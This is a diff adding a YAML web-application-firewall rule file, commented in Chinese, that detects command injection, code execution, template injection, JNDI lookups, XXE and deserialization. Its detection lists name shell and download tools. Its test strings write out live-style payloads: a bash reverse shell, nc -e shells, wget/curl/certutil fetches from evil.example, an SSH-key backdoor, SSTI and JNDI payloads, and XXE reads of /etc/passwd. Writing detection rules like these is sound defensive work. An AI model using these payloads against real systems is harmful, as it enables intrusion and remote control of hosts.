@@ -1,0 +1,495 @@
+# 命令注入 / 代码执行 / 模板注入 / XXE / 反序列化
+#
+# 变换链：urlDecode ×2 → replaceComments → compressWhitespace → lowercase
+#   replaceComments 在这里的作用是拆掉 `;/**/id` 这类注释分隔（变成 `; id`），
+#   而不是 used-by-SQL 的语义；这要求它替换为"空格"而不是删除（见 20-sqli.yaml 顶部说明）。
+#
+# 误报控制（对照上个 WAF 的教训）：
+#   - 裸反引号 `...` 与裸 $(...) 一律不写；必须"分隔符/替换符 + 命令名"同时成立。
+#   - 模板注入正则必须带危险标识符（__class__ / config / self / forName / Runtime），
+#     因此 {{name}}、{{price}}、${HOME} 这类正常模板文本不会被误伤。
+#   - XXE 不判 <!DOCTYPE，只判 <!ENTITY 与 SYSTEM/PUBLIC 的组合。
+version: 1
+meta:
+  name: "命令注入与代码执行"
+  author: "qingli"
+  category: rce
+
+rules:
+
+  - id: RCE-6001
+    phase: 2
+    severity: high
+    category: rce
+    score: 4
+    message: "命令注入迹象：shell 特征字符与结构（containsShellChars）"
+    tags: [rce, owasp-a03, cmdi, semantic]
+    targets:
+      - collection: ARGS
+      - collection: REQUEST_BODY
+    transforms:
+      - urlDecode
+      - urlDecode
+      - compressWhitespace
+      - lowercase
+    operator:
+      name: containsShellChars
+    test:
+      positive:
+        - "; cat /etc/passwd"
+        - "| whoami"
+        - "$(id)"
+      negative:
+        - "Cats; dogs; and birds"
+        - "the total is $5 (approx)"
+        - "Please confirm; the team will follow up"
+
+  - id: RCE-6002
+    phase: 2
+    severity: high
+    category: rce
+    score: 4
+    message: "命令注入特征：反引号或 $() 命令替换"
+    tags: [rce, owasp-a03, cmdi, substitution]
+    targets:
+      - collection: ARGS
+      - collection: REQUEST_BODY
+    transforms:
+      - urlDecode
+      - urlDecode
+      - replaceComments
+      - compressWhitespace
+      - lowercase
+    operator:
+      name: regex
+      params:
+        pattern: '\x60\s*(?:id|whoami|uname|hostname|cat|ls|curl|wget|nc|bash|sh|cmd|powershell|ping|nslookup|ifconfig|ipconfig|netstat|ps|chmod|rm)\b|\$\(\s*(?:id|whoami|uname|hostname|cat|ls|curl|wget|nc|bash|sh|cmd|powershell|ping|nslookup|ifconfig|ipconfig|netstat|ps|chmod|rm)\b'
+    test:
+      positive:
+        - "`id`"
+        - "$(whoami)"
+        - "`cat /etc/passwd`"
+        - "$(curl http://evil.example/x)"
+      negative:
+        - "the total is $5 (approx)"
+        - "Set the `PATH` variable in your shell profile"
+        - "$id is a required field"
+
+  - id: RCE-6003
+    phase: 2
+    severity: critical
+    category: rce
+    score: 5
+    message: "命令注入特征：命令分隔符后紧跟系统命令"
+    tags: [rce, owasp-a03, cmdi]
+    targets:
+      - collection: ARGS
+      - collection: REQUEST_BODY
+    transforms:
+      - urlDecode
+      - urlDecode
+      - replaceComments
+      - compressWhitespace
+      - lowercase
+    operator:
+      name: regex
+      params:
+        pattern: '[;&|]{1,2}\s*(?:cat|ls|dir|type)\s+[$/~.\-\x22\x27]|[;&|]{1,2}\s*(?:wget|curl)\s+https?://|[;&|]{1,2}\s*(?:whoami|uname|hostname|ifconfig|ipconfig|netstat|tasklist|systeminfo|nslookup|ping|nmap|nc|ncat|bash|sh|cmd|powershell|python|perl|ruby|php|chmod|chown|mkfifo|rm|cp|mv|kill)\b|[;&|]{1,2}\s*id\s*(?:$|[;&|])'
+    test:
+      positive:
+        - "; cat /etc/passwd"
+        - "| whoami"
+        - "& ping -c1 127.0.0.1"
+        - ";id;"
+        - "&& curl http://evil.example/x.sh"
+      negative:
+        - "Cats; dogs; and birds"
+        - "the order id 42 is missing"
+        - "Separator: A | B | C"
+        - "the total is 3; select the option"
+
+  - id: RCE-6004
+    phase: 2
+    severity: high
+    category: rce
+    score: 4
+    message: "命令执行特征：远程下载与管道执行"
+    tags: [rce, owasp-a03, download-execute]
+    targets:
+      - collection: ARGS
+      - collection: REQUEST_BODY
+    transforms:
+      - urlDecode
+      - urlDecode
+      - replaceComments
+      - compressWhitespace
+      - lowercase
+    operator:
+      name: pm
+      params:
+        patterns:
+          - "curl http"
+          - "curl -o"
+          - "curl -s"
+          - "curl -f"
+          - "curl -k"
+          - "wget http"
+          - "wget -o"
+          - "wget -q"
+          - "| bash"
+          - "|bash"
+          - "| sh"
+          - "|sh"
+          - "bash -i"
+          - "sh -i"
+          - "nc -e"
+          - "ncat -e"
+          - "socat "
+          - "python -c"
+          - "python3 -c"
+          - "perl -e"
+          - "ruby -e"
+          - "php -r"
+          - "powershell -enc"
+          - "powershell -e "
+          - "powershell -nop"
+          - "iex("
+          - "invoke-expression"
+          - "downloadstring"
+          - "downloadfile"
+          - "certutil -urlcache"
+          - "certutil -decode"
+          - "bitsadmin /transfer"
+          - "mshta http"
+          - "mshta javascript"
+          - "regsvr32 /s /u"
+          - "rundll32 javascript"
+          - "wmic process call create"
+    test:
+      positive:
+        - ";wget http://evil.example/x.sh -O /tmp/x"
+        - "curl http://169.254.169.254/latest/meta-data/"
+        - "powershell -enc SQBFAFgA"
+        - "cmd /c certutil -urlcache -f http://evil.example/x.exe y.exe"
+      negative:
+        - "please download the report from our website"
+        - "the API is documented at https://example.com/docs"
+        - "I will fetch the file later from the shared drive"
+
+  - id: RCE-6005
+    phase: 2
+    severity: high
+    category: rce
+    score: 4
+    message: "命令执行特征：反弹 shell 与持久化"
+    tags: [rce, owasp-a03, reverse-shell, persistence]
+    targets:
+      - collection: ARGS
+      - collection: REQUEST_BODY
+    transforms:
+      - urlDecode
+      - urlDecode
+      - replaceComments
+      - compressWhitespace
+      - lowercase
+    operator:
+      name: pm
+      params:
+        patterns:
+          - "/dev/tcp/"
+          - "bash -i >&"
+          - "sh -i >&"
+          - "nc -e /bin"
+          - "ncat -e /bin"
+          - "mkfifo /tmp"
+          - "rm -rf /"
+          - "chmod 777"
+          - "chmod 4755"
+          - "chmod +s"
+          - "authorized_keys"
+          - "ssh-rsa aaa"
+          - "crontab -"
+          - "/etc/cron"
+          - "systemctl enable"
+          - "nc -lvp"
+          - "nc -l -p"
+          - "socat tcp-connect"
+          - "openssl s_client -connect"
+          - "base64 -d | sh"
+          - "base64 --decode"
+    test:
+      positive:
+        - "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"
+        - "echo ssh-rsa AAAAB3NzaC1yc2EAAA... >> /root/.ssh/authorized_keys"
+        - "nc -e /bin/sh 10.0.0.1 4444"
+        - "echo Y3VybCB4 | base64 -d | sh"
+      negative:
+        - "the systemd unit is enabled for the service"
+        - "the deployment uses SSH keys stored in the vault"
+        - "chmod is used to change file permissions"
+
+  - id: RCE-6006
+    phase: 2
+    severity: high
+    category: rce
+    score: 4
+    message: "命令执行特征：Windows 命令与系统工具"
+    tags: [rce, owasp-a03, windows]
+    targets:
+      - collection: ARGS
+      - collection: REQUEST_BODY
+    transforms:
+      - urlDecode
+      - urlDecode
+      - replaceComments
+      - compressWhitespace
+      - lowercase
+    operator:
+      name: pm
+      params:
+        patterns:
+          - "cmd.exe /c"
+          - "cmd /c "
+          - "powershell.exe"
+          - "wmic "
+          - "reg add "
+          - "reg query "
+          - "reg delete "
+          - "schtasks /create"
+          - "net user "
+          - "net localgroup"
+          - "vssadmin delete"
+          - "bcdedit "
+          - "whoami /all"
+          - "ipconfig /all"
+          - "systeminfo"
+          - "tasklist /v"
+          - "netstat -ano"
+          - "dir c:\\"
+          - "type c:\\windows"
+          - "sc create"
+          - "sc stop"
+    test:
+      positive:
+        - "cmd.exe /c whoami"
+        - "net user hacker P@ssw0rd /add"
+        - "ipconfig /all"
+        - "reg add HKLM\\Software\\Run /v x /d y"
+      negative:
+        - "the system information page is at /about"
+        - "run the setup wizard to create an account"
+        - "please check your network settings"
+
+  - id: RCE-6007
+    phase: 2
+    severity: high
+    category: rce
+    score: 4
+    message: "代码执行特征：PHP/Java 危险函数"
+    tags: [rce, owasp-a03, code-execution]
+    targets:
+      - collection: ARGS
+      - collection: REQUEST_BODY
+    transforms:
+      - urlDecode
+      - urlDecode
+      - replaceComments
+      - compressWhitespace
+      - lowercase
+    operator:
+      name: pm
+      params:
+        patterns:
+          - "system("
+          - "exec("
+          - "shell_exec("
+          - "passthru("
+          - "popen("
+          - "proc_open("
+          - "pcntl_exec("
+          - "eval("
+          - "assert("
+          - "create_function("
+          - "call_user_func("
+          - "base64_decode("
+          - "gzinflate("
+          - "str_rot13("
+          - "preg_replace("
+          - "runtime.getruntime().exec"
+          - "processbuilder("
+          - "class.forname("
+          - "scriptengine"
+          - "classloader"
+          - "defineclass("
+          - "ognl."
+          - "spelexpressionparser"
+    test:
+      positive:
+        - "<?php system($_GET['cmd']); ?>"
+        - "eval(base64_decode('ZWNobyAxOw=='))"
+        - "java.lang.Runtime.getRuntime().exec(\"id\")"
+      negative:
+        - "the system is down for maintenance"
+        - "please execute the migration script"
+        - "we evaluated the proposal last week"
+
+  - id: RCE-6008
+    phase: 2
+    severity: high
+    category: rce
+    score: 5
+    message: "模板注入特征：模板引擎危险标识符"
+    tags: [rce, ssti, template-injection]
+    targets:
+      - collection: ARGS
+      - collection: REQUEST_BODY
+    transforms:
+      - urlDecode
+      - urlDecode
+      - lowercase
+    operator:
+      name: regex
+      params:
+        pattern: '\{\{[^}]{0,120}(?:__class__|__mro__|__subclasses__|__globals__|__builtins__|__init__|__base__|config\b|self\.|request\.|cycler|joiner|namespace|lipsum|getenv|os\.environ|popen|system\()|\$\{[^}]{0,120}(?:class\.forname|getruntime|runtime\b|scriptengine|\bt\(|processbuilder|exec\()|#\{[^}]{0,120}(?:class\.forname|getruntime|runtime\b|processbuilder)|\*\{[^}]{0,120}(?:__class__|getruntime|runtime\b|processbuilder|\bt\()'
+    test:
+      positive:
+        - "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}"
+        - "${T(java.lang.Runtime).getRuntime().exec('id')}"
+        - "{{''.__class__.__mro__[1].__subclasses__()}}"
+        - "#{T(java.lang.Runtime).getRuntime().exec('id')}"
+      negative:
+        - "Hello {{name}}, your order is ready"
+        - "Template: {{ user.first_name }} - invoice {{invoice_no}}"
+        - "Use ${HOME} in your shell profile"
+        - "The price is {{price}} USD"
+
+  - id: RCE-6009
+    phase: 2
+    severity: critical
+    category: rce
+    score: 5
+    message: "JNDI 注入特征：Log4j 风格的 ${jndi:} 查找"
+    tags: [rce, log4shell, jndi, owasp-a03]
+    targets:
+      - collection: ARGS
+      - collection: REQUEST_BODY
+      - collection: REQUEST_HEADERS
+    transforms:
+      - urlDecode
+      - urlDecode
+      - replaceComments
+      - compressWhitespace
+      - lowercase
+    operator:
+      name: pm
+      params:
+        patterns:
+          - "${jndi:"
+          - "jndi:ldap://"
+          - "jndi:rmi://"
+          - "jndi:dns://"
+          - "jndi:iiop://"
+          - "jndi:ldaps://"
+          - "${::-j}"
+          - "${lower:j}"
+          - "${upper:j}"
+    test:
+      positive:
+        - "${jndi:ldap://evil.example/a}"
+        - "$%7Bjndi:ldap://evil.example/a%7D"
+        - "${jndi:rmi://10.0.0.1:1099/x}"
+        - "${lower:j}ndi:ldap://evil.example/a"
+      negative:
+        - "The total is ${price} USD"
+        - "LDAP server: ldaps://corp.example:636"
+        - "JNDI is a Java naming and directory interface"
+
+  - id: RCE-6010
+    phase: 2
+    severity: high
+    category: rce
+    score: 5
+    message: "XXE 特征：外部实体声明"
+    tags: [rce, xxe, owasp-a03, xml]
+    targets:
+      - collection: ARGS
+      - collection: REQUEST_BODY
+      - collection: ARGS_XML
+    transforms:
+      - urlDecode
+      - urlDecode
+      - lowercase
+    operator:
+      name: regex
+      params:
+        pattern: '<!entity\s+[a-z_%][^>]{0,160}\b(?:system|public)\b|<!doctype[^>]{0,300}\[\s*<!entity|<\s*xi:include|<!entity\s+%\s'
+    test:
+      positive:
+        - "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>"
+        - "<!DOCTYPE x [<!ENTITY % p SYSTEM \"http://evil.example/x.dtd\"> %p;]>"
+        - "<x><xi:include href=\"file:///etc/passwd\" parse=\"text\"/></x>"
+      negative:
+        - "<?xml version=\"1.0\"?><root><item>hello</item></root>"
+        - "<!DOCTYPE html><html><body>hi</body></html>"
+        - "<x:include xmlns:x=\"urn:example\">no</x:include>"
+
+  - id: RCE-6011
+    phase: 2
+    severity: high
+    category: rce
+    score: 5
+    message: "反序列化特征：PHP/Java/Python 序列化数据"
+    tags: [rce, deserialization, owasp-a08]
+    targets:
+      - collection: ARGS
+      - collection: REQUEST_BODY
+      - collection: REQUEST_COOKIES
+    transforms:
+      - urlDecode
+      - urlDecode
+      - lowercase
+    operator:
+      name: pm
+      params:
+        patterns:
+          - "o:4:\""
+          - "o:3:\""
+          - "o:5:\""
+          - "o:6:\""
+          - "o:7:\""
+          - "o:8:\""
+          - "o:9:\""
+          - "o:10:\""
+          - "o:11:\""
+          - "o:12:\""
+          - "o:13:\""
+          - "o:14:\""
+          - "o:15:\""
+          - "o:16:\""
+          - "o:17:\""
+          - "o:18:\""
+          - "o:20:\""
+          - "o:24:\""
+          - "__php_incomplete_class"
+          - "_$$nd_func"
+          - "ro0ab"
+          - "aced0005"
+          - "java.io.objectinputstream"
+          - "ysoserial"
+          - "!!python/object"
+          - "!!python/object/apply"
+          - "yaml.load("
+          - "pickle.loads"
+          - "cpickle.loads"
+          - "gopher://127.0.0.1"
+          - "c:11:\"arrayobject\""
+    test:
+      positive:
+        - "O:8:\"stdClass\":1:{s:4:\"name\";s:5:\"admin\";}"
+        - "rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcA=="
+        - "!!python/object/apply:os.system [\"id\"]"
+        - "aced000574000c74657374"
+      negative:
+        - "Order reference O:4: has been confirmed"
+        - "please load the configuration file"
+        - "aGVsbG8gd29ybGQ="
